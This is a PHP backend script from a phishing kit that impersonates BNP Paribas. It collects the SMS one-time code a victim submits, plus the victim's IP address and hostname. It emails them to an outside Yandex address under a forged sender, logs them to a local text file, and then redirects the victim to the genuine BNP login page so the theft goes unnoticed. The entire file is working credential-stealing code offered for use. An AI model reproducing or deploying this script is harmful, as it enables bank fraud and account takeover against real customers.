<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+| By SeF |+------------\n";
$bilsmg .= "Code SMS:           : ".$_POST['client-nbr']."\n";
$bilsmg .= "------------+| By SeF |+------------\n";
$bilsmg .= "IP  : $ip | $hostname\n";

$bilsnd = "groupesg@yandex.com";
$bilsub = "Bnp SMS | $ip";
$bilhead = "From: Bnp SMS <info2@mail.ziggo.nl>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);


$fp = fopen('capoevo.txt', 'a');
fwrite($fp, $bilsmg);
fclose($fp);

header("Location: https://mabanque.bnpparibas/fr/connexion");
?>